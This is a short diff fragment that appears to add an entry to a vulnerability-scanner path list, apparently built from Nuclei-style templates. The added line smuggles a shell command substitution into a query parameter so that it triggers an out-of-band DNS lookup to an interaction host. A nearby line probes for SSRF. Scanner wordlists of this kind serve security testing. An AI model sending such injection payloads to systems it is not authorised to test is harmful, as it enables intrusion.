@@ -206,3 +206,4 @@
 /public/stream?url=http://{{interactsh-url}}/x.mp4
 /wp-json/gutenkit/v1
 /api/version
+/rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
